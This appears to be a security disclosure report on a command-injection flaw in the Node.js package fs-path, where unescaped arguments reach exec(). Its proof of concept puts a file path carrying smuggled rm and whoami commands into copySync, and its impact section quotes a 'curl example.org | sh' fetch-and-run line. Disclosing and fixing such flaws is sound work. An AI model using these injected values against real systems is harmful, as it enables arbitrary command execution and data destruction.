## Vulnerability Information
I would like to report command injection in `fs-path`.
It allows to inject and execute arbitrary shell commands while performing various operations from `fs-path` API like copying files.

# Vulnerability

## Vulnerability Description

Arguments are not properly escaped before being concatenated into the command that is passed to `exec()`/`execSync()`.

 See https://github.com/pillys/fs-path/blob/master/lib/index.js

## Steps To Reproduce:

```js
const fsPath = require('fs-path');
const source = '/bin/ls';
const target =  '/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar';
fsPath.copySync(source, target);
```

Observe `/tmp/bar` being created with `whoami` output.

The same issue affects other methods in `fs-path` API, not just `copySync`.

## Patch

The suggested fix is to avoid using `exec`/`execSync` and instead pass parameters as an array of arguments to corresponding `child_process` methods.

## Supporting Material/References:

* Arch Linux current
* Node.js 9.7.1
* npm 5.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

For setups where user input could end up in arguments of calls to `fs-wrap` API (like filename etc), users would be able to execute arbitrary shell commands.

Note that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff `/` and `..` is not enough â€” commands like `curl example.org | sh` might pass through sanitization of user input (like filenames etc.) on the application side.
